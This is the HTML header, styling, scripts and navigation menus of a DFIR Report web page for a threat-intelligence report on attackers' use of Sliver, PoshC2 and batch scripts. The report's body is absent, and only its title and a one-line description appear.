<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Threat Actors&#8217; Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="6a763440a26db97cfd8463be-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="6a763440a26db97cfd8463be-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/37127" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=37127' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F08%2F12%2Fthreat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F08%2F12%2Fthreat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="6a763440a26db97cfd8463be-text/javascript"></script>
		<script type="6a763440a26db97cfd8463be-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="6a763440a26db97cfd8463be-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=66296D267B0A5B83E5CF025C63CC1287');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Threat Actors&#8217; Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts" />
<meta property="og:url" content="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" />
<meta property="og:description" content="Key Takeaways In early December of 2023, we discovered an open directory filled with batch scripts, primarily designed for defense evasion and executing command and control payloads. These scripts …" />
<meta property="article:published_time" content="2024-08-12T01:46:57+00:00" />
<meta property="article:modified_time" content="2024-08-12T02:05:38+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png" />
<meta property="og:image:width" content="4903" />
<meta property="og:image:height" content="2977" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Threat Actors&#8217; Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-37127 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
